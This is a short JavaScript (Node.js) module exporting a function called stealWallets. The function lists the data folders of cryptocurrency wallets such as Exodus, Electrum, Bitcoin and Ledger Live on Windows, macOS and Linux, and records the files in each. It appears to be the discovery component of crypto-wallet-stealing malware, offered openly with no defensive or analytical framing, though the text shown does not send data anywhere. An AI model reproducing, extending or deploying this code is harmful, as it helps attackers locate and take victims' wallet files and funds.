import fs from "node:fs";
import os from "node:os";
import path from "node:path";

const WALLET_PATHS = {
  win32: [
    ["Exodus", "Exodus"],
    ["Electrum", "Electrum"],
    ["Ethereum", "Ethereum"],
    ["Bitcoin", "Bitcoin"],
    ["Monero", "Monero"],
    ["Ledger Live", "Ledger Live"],
  ],
  darwin: [
    ["Exodus", "Library/Application Support/Exodus"],
    ["Electrum", ".electrum"],
    ["Bitcoin", "Library/Application Support/Bitcoin"],
  ],
  linux: [
    ["Exodus", ".config/Exodus"],
    ["Electrum", ".electrum"],
    ["Bitcoin", ".bitcoin"],
  ],
};

export function stealWallets() {
  const p = os.platform();
  const list = WALLET_PATHS[p] || [];
  const result = { wallets: [] };
  const home = os.homedir();

  for (const item of list) {
    const name = item[0];
    const sub = item[1];
    let base;

    if (p === "win32") {
      base = process.env.APPDATA ? path.join(process.env.APPDATA, sub) : null;
    } else {
      base = path.join(home, sub);
    }

    if (!base || !fs.existsSync(base)) continue;

    try {
      const files = fs.readdirSync(base).slice(0, 50);
      const fileInfos = files.map(function (f) {
        const full = path.join(base, f);
        try {
          const stat = fs.statSync(full);
          return { file: f, size: stat.size, isDir: stat.isDirectory() };
        } catch (e) {
          return { file: f };
        }
      });
      result.wallets.push({ name: name, path: base, files: fileInfos });
    } catch (e) {}
  }

  return result;
}
